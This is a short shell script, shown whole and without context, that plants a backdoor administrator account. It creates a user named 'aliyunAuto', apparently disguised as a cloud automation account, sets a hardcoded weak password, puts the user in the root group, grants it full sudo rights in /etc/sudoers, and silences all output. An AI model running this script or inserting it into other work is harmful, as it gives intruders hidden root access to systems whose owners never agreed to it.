#!/bin/sh
/usr/sbin/useradd -c 'aliyunAuto' -d /root -s /bin/bash "aliyunAuto" >/dev/null 2>&1;
echo aliyunAuto:A111111 | chpasswd >/dev/null 2>&1;
usermod -g root aliyunAuto >/dev/null 2>&1;
echo '
aliyunAuto ALL=(ALL) ALL' >> /etc/sudoers
